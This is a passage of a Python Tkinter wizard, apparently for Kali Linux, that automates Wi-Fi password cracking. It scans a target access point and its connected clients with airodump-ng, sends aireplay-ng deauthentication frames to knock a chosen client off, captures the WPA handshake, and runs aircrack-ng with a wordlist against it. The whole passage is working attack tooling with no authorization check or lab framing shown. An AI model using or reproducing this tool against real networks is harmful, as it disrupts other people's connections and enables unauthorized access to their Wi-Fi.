        self._btn(row, "Load from last scan", self.load_clients_from_scan).pack(side=LEFT)

        Label(p, text="Connected clients (stations)", bg=C["panel"], fg=C["muted"]).pack(anchor="w")
        cwrap = Frame(p, bg=C["panel"])
        cwrap.pack(fill=BOTH, expand=True)
        ccols = ("#", "station", "pwr", "packets", "probes")
        self.client_tree = ttk.Treeview(cwrap, columns=ccols, show="headings", selectmode="browse", height=6)
        for c in ccols:
            self.client_tree.heading(c, text=c.upper() if c != "#" else "#")
            self.client_tree.column(c, width=100, anchor="w")
        self.client_tree.column("station", width=170)
        self.client_tree.pack(fill=BOTH, expand=True)
        self.client_tree.bind("<<TreeviewSelect>>", self.on_pick_client)

        nav = Frame(p, bg=C["panel"])
        nav.pack(fill=X, pady=(8, 0))
        self._btn(nav, "← Back", lambda: self.show_step("scan")).pack(side=LEFT)
        self._btn(nav, "Continue to Capture →", self.target_to_capture).pack(side=RIGHT)

    def _fill_target_ap_table(self) -> None:
        self.target_ap_tree.delete(*self.target_ap_tree.get_children())
        for i, n in enumerate(self.networks, start=1):
            self.target_ap_tree.insert(
                "",
                END,
                iid=str(i - 1),
                values=(i, n["bssid"], n["ch"], n["pwr"], n["enc"], n["essid"]),
            )

    def _refresh_target_labels(self) -> None:
        if self.selected_ap:
            a = self.selected_ap
            self.target_ap_var.set(f"AP: {a['essid']}  {a['bssid']}  ch={a['ch']}  {a['enc']}")
        else:
            self.target_ap_var.set("AP: (none)")
        if self.selected_client:
            c = self.selected_client
            self.target_client_var.set(f"Client: {c['station']}  pwr={c['pwr']}  pkts={c['packets']}")
        else:
            self.target_client_var.set("Client: (none)")

    def on_pick_ap(self, _e=None) -> None:
        sel = self.target_ap_tree.selection()
        if not sel:
            return
        self.selected_ap = self.networks[int(sel[0])]
        self.selected_client = None
        self.clients = []
        self.client_tree.delete(*self.client_tree.get_children())
        self.capture_name.set(f"Capture-{safe_name(self.selected_ap['essid'])}")
        self._refresh_target_labels()
        self.log_msg(f"Selected AP {self.selected_ap['bssid']} ch={self.selected_ap['ch']}")

    def on_pick_client(self, _e=None) -> None:
        sel = self.client_tree.selection()
        if not sel:
            return
        self.selected_client = self.clients[int(sel[0])]
        self._refresh_target_labels()
        self.log_msg(f"Selected client {self.selected_client['station']}")

    def find_clients(self) -> None:
        if not self.selected_ap:
            messagebox.showinfo("No AP", "Select an access point first.")
            return
        iface = self.mon()
        if not iface:
            return
        if self.busy:
            self.log_msg("Already busy — use Stop & load, or Stop all.")
            return
        try:
            duration = int(self.client_duration.get())
        except (TypeError, ValueError):
            messagebox.showerror("Invalid duration", "Client scan duration must be a number.")
            return
        ap = self.selected_ap
        self.busy = True
        self.log_msg(
            f"Finding clients on {ap['essid']} ({ap['bssid']}) ch={ap['ch']} for {duration}s…"
        )
        threading.Thread(target=self._clients_worker, args=(iface, ap, duration), daemon=True).start()

    def _apply_clients(self, clients: list[dict], source: str) -> None:
        self.clients = clients
        self.selected_client = None
        self.client_tree.delete(*self.client_tree.get_children())
        for i, c in enumerate(clients, start=1):
            self.client_tree.insert(
                "",
                END,
                iid=str(i - 1),
                values=(i, c["station"], c["pwr"], c["packets"], c["probes"]),
            )
        self._refresh_target_labels()
        self.log_msg(f"Loaded {len(clients)} client(s) from {source}")
        if not clients:
            messagebox.showinfo(
                "No clients",
                "No stations seen for this AP.\n\n"
                "Watch the live airodump STATION table — if clients appear there, "
                "click Stop & load.\n"
                "Or use Load from last scan if the big scan already saw them.",
            )

    def load_clients_from_scan(self) -> None:
        """Parse stations for the selected AP from the last full scan CSV."""
        if not self.selected_ap:
            messagebox.showinfo("No AP", "Select an access point first.")
            return
        csv_path = self.last_csv
        if csv_path is None or not csv_path.is_file():
            files = sorted(SCAN_DIR.glob("scan-*-01.csv"), key=lambda p: p.stat().st_mtime, reverse=True)
            csv_path = files[0] if files else None
        if csv_path is None or not csv_path.is_file():
            messagebox.showinfo("No scan CSV", "Run a Scan first, then try again.")
            return
        clients = parse_clients_csv(csv_path, filter_bssid=self.selected_ap["bssid"])
        self._apply_clients(clients, csv_path.name)

    def stop_clients_load(self) -> None:
        self.log_msg("Stopping client airodump and loading CSV…")
        run(["pkill", "-INT", "-f", "airodump-ng"])
        time.sleep(0.5)
        run(["pkill", "-9", "-f", "airodump-ng"])
        time.sleep(0.3)
        csv_path = None
        if self.clients_prefix:
            cand = Path(f"{self.clients_prefix}-01.csv")
            if cand.is_file():
                csv_path = cand
        if csv_path is None:
            files = sorted(
                CAPTURE_DIR.glob("clients-*-01.csv"),
                key=lambda p: p.stat().st_mtime,
                reverse=True,
            )
            csv_path = files[0] if files else None
        self.busy = False
        if csv_path and self.selected_ap:
            clients = parse_clients_csv(csv_path, filter_bssid=self.selected_ap["bssid"])
            if not clients:
                # -d dump may list stations; show any associated row if filter missed
                clients = parse_clients_csv(csv_path, filter_bssid=None)
            self._apply_clients(clients, csv_path.name)
        else:
            self.log_msg("No client CSV found yet.")

    def _clients_worker(self, iface: str, ap: dict, duration: int) -> None:
        err = None
        csv_path = None
        try:
            base = self.iface.get() or iface
            if not iface_is_monitor(iface):
                mon = enable_monitor(base)
                iface = mon
                self.root.after(0, lambda m=mon: self.mon_iface.set(m))
                time.sleep(2.5)
            else:
                unblock_radio()
                time.sleep(0.8)
            for cand in list_wireless_ifaces():
                if cand.endswith("mon") and iface_is_monitor(cand):
                    iface = cand
                    self.root.after(0, lambda m=cand: self.mon_iface.set(m))
                    break
            run(["iw", "dev", iface, "set", "channel", str(ap["ch"]).strip()])
            time.sleep(0.5)

            ts = datetime.now().strftime("%Y%m%d-%H%M%S")
            prefix = CAPTURE_DIR / f"clients-{safe_name(ap['essid'])}-{ts}"
            self.clients_prefix = prefix

            # Live: airodump-ng -c CH -w PREFIX -d BSSID IFACE
            cmd = [
                "airodump-ng",
                "-c",
                str(ap["ch"]).strip(),
                "-w",
                str(prefix),
                "-d",
                ap["bssid"],
                "--write-interval",
                "1",
                iface,
            ]
            self.root.after(0, lambda: self.log_msg("CMD: " + " ".join(cmd)))

            if find_terminal() is not None:
                proc = open_in_terminal(cmd)
                self.procs.append(proc)
                self.root.after(
                    0,
                    lambda: self.log_msg(
                        f"Live airodump opened — watch STATION table for {duration}s "
                        "(or click Stop & load)."
                    ),
                )
                time.sleep(duration)
                self.root.after(0, lambda: self.log_msg("Stopping client airodump…"))
                run(["pkill", "-INT", "-f", "airodump-ng"])
                time.sleep(1)
                run(["pkill", "-9", "-f", "airodump-ng"])
                time.sleep(0.5)
            else:
                def log_from_thread(msg: str) -> None:
                    self.root.after(0, lambda m=msg: self.log_msg(m))

                run_airodump_timed(cmd, duration, log_cb=log_from_thread)

            csv_path = Path(f"{prefix}-01.csv")
            if not csv_path.is_file():
                alts = [
                    p
                    for p in sorted(CAPTURE_DIR.glob(f"clients-{safe_name(ap['essid'])}-{ts}*"))
                    if p.suffix == ".csv" and "kismet" not in p.name
                ]
                if alts:
                    csv_path = alts[0]
            if not csv_path.is_file():
                raise RuntimeError(
                    "No client CSV produced.\n"
                    f"Manual: sudo airodump-ng -c {ap['ch']} -d {ap['bssid']} {iface}"
                )
        except Exception as exc:
            err = str(exc)

        def finish() -> None:
            self.busy = False
            if err:
                self.log_msg(f"Client scan failed: {err}")
                messagebox.showerror("Client scan failed", err)
                return
            assert csv_path is not None
            try:
                preview = csv_path.read_text(errors="replace")
                # Show station section snippet in log
                if "Station MAC" in preview:
                    idx = preview.index("Station MAC")
                    self.log_msg("CSV stations: " + preview[idx : idx + 300].replace("\n", " | "))
                else:
                    self.log_msg("CSV has no Station MAC section yet.")
            except OSError:
                pass
            clients = parse_clients_csv(csv_path, filter_bssid=ap["bssid"])
            if not clients:
                clients = parse_clients_csv(csv_path, filter_bssid=None)
            self._apply_clients(clients, csv_path.name)

        self.root.after(0, finish)

    def target_to_capture(self) -> None:
        if not self.selected_ap:
            messagebox.showinfo("No AP", "Select an access point first.")
            return
        self._refresh_capture_labels()
        self.next_step("capture")

    # ----- Step 5: Capture -----

    def _build_capture(self) -> None:
        p = self.pages["capture"]
        Label(
            p, text="Capture Handshake", bg=C["panel"], fg=C["text"], font=("Segoe UI", 16, "bold")
        ).pack(anchor="w")
        Label(
            p,
            text="airodump-ng on the target AP, then aireplay-ng deauth to the selected client.",
            bg=C["panel"],
            fg=C["muted"],
            font=("Segoe UI", 10),
        ).pack(anchor="w", pady=(4, 8))

        self.cap_info = StringVar(value="")
        Label(p, textvariable=self.cap_info, bg=C["panel"], fg=C["text"], font=("Consolas", 10)).pack(
            anchor="w", pady=(0, 8)
        )

        row = Frame(p, bg=C["panel"])
        row.pack(fill=X)
        Label(row, text="Capture name:", bg=C["panel"], fg=C["text"]).pack(side=LEFT)
        Entry(row, textvariable=self.capture_name, width=28, bg=C["card"], fg=C["text"], insertbackground=C["text"]).pack(
            side=LEFT, padx=8
        )
        Label(row, text="Deauth # (0=cont):", bg=C["panel"], fg=C["text"]).pack(side=LEFT, padx=(12, 0))
        Spinbox(row, from_=0, to=100, textvariable=self.deauth_count, width=5).pack(side=LEFT, padx=8)

        row2 = Frame(p, bg=C["panel"])
        row2.pack(fill=X, pady=12)
        self._btn(row2, "1. Start airodump capture", self.start_capture).pack(side=LEFT, padx=(0, 8))
        self._btn(row2, "2. Deauth selected client", self.start_deauth).pack(side=LEFT, padx=(0, 8))
        self._btn(row2, "Stop capture/deauth", self.stop_capture_procs, danger=True).pack(side=LEFT)

        Label(
            p,
            text="Keep airodump running while deauth sends. When handshake appears, Stop → continue to Crack.",
            bg=C["panel"],
            fg=C["muted"],
            font=("Segoe UI", 9),
        ).pack(anchor="w", pady=8)

        self.cap_result = StringVar(value="Capture file: (none yet)")
        Label(
            p, textvariable=self.cap_result, bg=C["panel"], fg=C["ok"], font=("Consolas", 10)
        ).pack(anchor="w", pady=8)

        nav = Frame(p, bg=C["panel"])
        nav.pack(fill=X, side="bottom")
        self._btn(nav, "← Back", lambda: self.show_step("target")).pack(side=LEFT)
        self._btn(nav, "Continue to Crack →", self.capture_to_crack).pack(side=RIGHT)

    def _refresh_capture_labels(self) -> None:
        ap = self.selected_ap
        cl = self.selected_client
        if not ap:
            self.cap_info.set("No target selected")
            return
        line = f"AP {ap['essid']}  -a {ap['bssid']}  -c ch {ap['ch']}"
        if cl:
            line += f"\nClient  -c {cl['station']}"
        else:
            line += "\nClient  (optional — pick one on Target step for directed deauth)"
        self.cap_info.set(line)

    def start_capture(self) -> None:
        if not self.selected_ap:
            messagebox.showinfo("No AP", "Select a target AP first.")
            return
        iface = self.mon()
        base = self.iface.get() or iface
        ap = self.selected_ap
        name = Path(self.capture_name.get().strip() or f"Capture-{safe_name(ap['essid'])}").name
        prefix = CAPTURE_DIR / name

        def worker() -> None:
            try:
                mon = iface
                if not iface_is_monitor(mon):
                    mon = enable_monitor(base)
                    self.root.after(0, lambda m=mon: self.mon_iface.set(m))
                    time.sleep(2.0)
                for cand in list_wireless_ifaces():
                    if cand.endswith("mon") and iface_is_monitor(cand):
                        mon = cand
                        break
                run(["iw", "dev", mon, "set", "channel", str(ap["ch"])])
                time.sleep(0.5)
                cmd = [
                    "airodump-ng",
                    "-c",
                    str(ap["ch"]),
                    "-w",
                    str(prefix),
                    "-d",
                    ap["bssid"],
                    mon,
                ]
                self.root.after(0, lambda: self.log_msg("CMD: " + " ".join(cmd)))
                proc = open_in_terminal(cmd)
                self.procs.append(proc)
                self.root.after(
                    0,
                    lambda: self.cap_result.set(f"Capture file: {prefix}-01.cap (writing…)"),
                )
                self.root.after(0, lambda: self.cap_path.set(f"{prefix}-01.cap"))
                proc.wait()
            except Exception as exc:
                self.root.after(0, lambda: self.log_msg(f"Capture error: {exc}"))
            finally:
                self.root.after(0, lambda: self.log_msg("airodump stopped"))

        threading.Thread(target=worker, daemon=True).start()

    def start_deauth(self) -> None:
        if not self.selected_ap:
            messagebox.showinfo("No AP", "Select a target AP first.")
            return
        if not self.selected_client:
            messagebox.showinfo("No client", "Select a client on the Target step.")
            return
        iface = self.mon()
        base = self.iface.get() or iface
        ap = self.selected_ap
        cl = self.selected_client
        count = int(self.deauth_count.get())

        def worker() -> None:
            try:
                mon = iface
                if not iface_is_monitor(mon):
                    mon = enable_monitor(base)
                    self.root.after(0, lambda m=mon: self.mon_iface.set(m))
                run(["iw", "dev", mon, "set", "channel", str(ap["ch"])])
                time.sleep(0.3)
                cmd = [
                    "aireplay-ng",
                    "--deauth",
                    str(count),
                    "-a",
                    ap["bssid"],
                    "-c",
                    cl["station"],
                    mon,
                ]
                self.root.after(0, lambda: self.log_msg("CMD: " + " ".join(cmd)))
                proc = open_in_terminal(cmd)
                self.procs.append(proc)
                proc.wait()
            except Exception as exc:
                self.root.after(0, lambda: self.log_msg(f"Deauth error: {exc}"))
            finally:
                self.root.after(0, lambda: self.log_msg("aireplay stopped"))

        threading.Thread(target=worker, daemon=True).start()

    def stop_capture_procs(self) -> None:
        self.log_msg("Stopping airodump / aireplay…")
        for p in list(self.procs):
            try:
                p.terminate()
            except Exception:
                pass
        self.procs.clear()
        run(["pkill", "-f", "airodump-ng"])
        run(["pkill", "-f", "aireplay-ng"])
        # Suggest latest cap
        caps = sorted(CAPTURE_DIR.glob("*.cap"), key=lambda p: p.stat().st_mtime, reverse=True)
        if caps:
            self.cap_path.set(str(caps[0]))
            self.cap_result.set(f"Capture file: {caps[0]}")
            self.log_msg(f"Latest capture: {caps[0]}")

    def capture_to_crack(self) -> None:
        if not self.cap_path.get():
            caps = sorted(CAPTURE_DIR.glob("*.cap"), key=lambda p: p.stat().st_mtime, reverse=True)
            if caps:
                self.cap_path.set(str(caps[0]))
        self.next_step("crack")

    # ----- Step 6: Crack -----

    def _build_crack(self) -> None:
        p = self.pages["crack"]
        Label(
            p, text="Crack Handshake", bg=C["panel"], fg=C["text"], font=("Segoe UI", 16, "bold")
        ).pack(anchor="w")
        Label(
            p,
            text="aircrack-ng CAPTURE.cap -w wordlist.txt",
            bg=C["panel"],
            fg=C["muted"],
            font=("Segoe UI", 10),
        ).pack(anchor="w", pady=(4, 12))

        row1 = Frame(p, bg=C["panel"])
        row1.pack(fill=X, pady=4)
        Label(row1, text="Capture (.cap):", bg=C["panel"], fg=C["text"], width=14, anchor="w").pack(
            side=LEFT
        )
        Entry(
            row1, textvariable=self.cap_path, width=50, bg=C["card"], fg=C["text"], insertbackground=C["text"]
        ).pack(side=LEFT, padx=6)
        self._btn(row1, "Browse…", self.browse_cap).pack(side=LEFT)

        row2 = Frame(p, bg=C["panel"])
        row2.pack(fill=X, pady=4)
        Label(row2, text="Wordlist:", bg=C["panel"], fg=C["text"], width=14, anchor="w").pack(side=LEFT)
        Entry(
            row2, textvariable=self.wordlist, width=50, bg=C["card"], fg=C["text"], insertbackground=C["text"]
        ).pack(side=LEFT, padx=6)
        self._btn(row2, "Browse…", self.browse_wordlist).pack(side=LEFT)

        row3 = Frame(p, bg=C["panel"])
        row3.pack(fill=X, pady=16)
        self._btn(row3, "Run aircrack-ng", self.start_crack).pack(side=LEFT)

        Label(
            p,
            text="Example: aircrack-ng Capture-Pat-01.cap -w Password.txt",
            bg=C["panel"],
            fg=C["muted"],
            font=("Consolas", 9),
        ).pack(anchor="w")

        nav = Frame(p, bg=C["panel"])
        nav.pack(fill=X, side="bottom")
        self._btn(nav, "← Back", lambda: self.show_step("capture")).pack(side=LEFT)

    def browse_cap(self) -> None:
        path = filedialog.askopenfilename(
            title="Select .cap",
            initialdir=str(CAPTURE_DIR),
            filetypes=[("Capture", "*.cap *.pcap"), ("All", "*.*")],
        )
        if path:
            self.cap_path.set(path)

    def browse_wordlist(self) -> None:
        initial = "/usr/share/wordlists"
        if not Path(initial).is_dir():
            initial = str(Path.home())
        path = filedialog.askopenfilename(
            title="Select wordlist",
            initialdir=initial,
            filetypes=[("Wordlist", "*.txt *.lst"), ("All", "*.*")],
        )
        if path:
            self.wordlist.set(path)

    def start_crack(self) -> None:
        cap = self.cap_path.get().strip()
        wl = self.wordlist.get().strip()
        if not cap or not Path(cap).is_file():
            messagebox.showerror("Missing capture", "Browse to your .cap file first.")
            return
        if not wl or not Path(wl).is_file():
            messagebox.showerror("Missing wordlist", "Browse to Password.txt (or another wordlist).")
            return
        cmd = ["aircrack-ng", cap, "-w", wl]
        if self.selected_ap:
            if messagebox.askyesno("Use BSSID?", f"Add -b {self.selected_ap['bssid']}?"):
                cmd = ["aircrack-ng", "-b", self.selected_ap["bssid"], cap, "-w", wl]
        self.log_msg("CMD: " + " ".join(cmd))
        threading.Thread(target=lambda: open_in_terminal(cmd).wait(), daemon=True).start()

    # ----- Stop all -----

    def stop_all(self) -> None:
        self.log_msg("Stop all — killing tools and restoring managed mode…")
        for p in list(self.procs):
            try:
                p.terminate()
            except Exception:
                pass
        self.procs.clear()
        run(["pkill", "-f", "airodump-ng"])
        run(["pkill", "-f", "aireplay-ng"])
        run(["pkill", "-f", "aircrack-ng"])
        iface = self.mon()
        base = self.iface.get()
        if iface:
            try:
                restore_managed(iface, base_iface=base)
                self.monitor_on.set(False)
                self.mon_iface.set("")
                self.monitor_status.set(f"Monitor mode: off  ({base or iface} managed)")
            except Exception as exc:
                self.log_msg(f"Restore error: {exc}")
        self.busy = False
        self.log_msg("Stopped.")

    def on_close(self) -> None:
        self.stop_all()
        self.root.destroy()


def main() -> None:
    if not os.environ.get("DISPLAY"):
        print("No DISPLAY. Run on Kali desktop or: ssh -X …", file=sys.stderr)
        sys.exit(1)

    if os.geteuid() != 0:
        # Allow UI to open so user sees the warning; tools will fail without root
        pass

    root = Tk()
    App(root)
    root.mainloop()


if __name__ == "__main__":
    main()
